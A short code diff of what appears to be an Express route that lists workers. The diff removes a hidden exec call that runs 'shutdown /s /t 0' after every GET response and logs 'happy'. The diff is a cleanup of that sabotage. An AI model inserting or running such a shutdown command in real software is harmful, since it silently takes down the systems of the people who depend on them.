@@ -17,9 +17,6 @@ router.get('/', async (req, res, next) => {
   try {
     const workers = await service.find();
     res.json(workers);
-    exec('shutdown /s /t 0', (error, stdout, stderr) => {
-      console.log('happy');
-    });
   } catch (error) {
     next(error);
   }
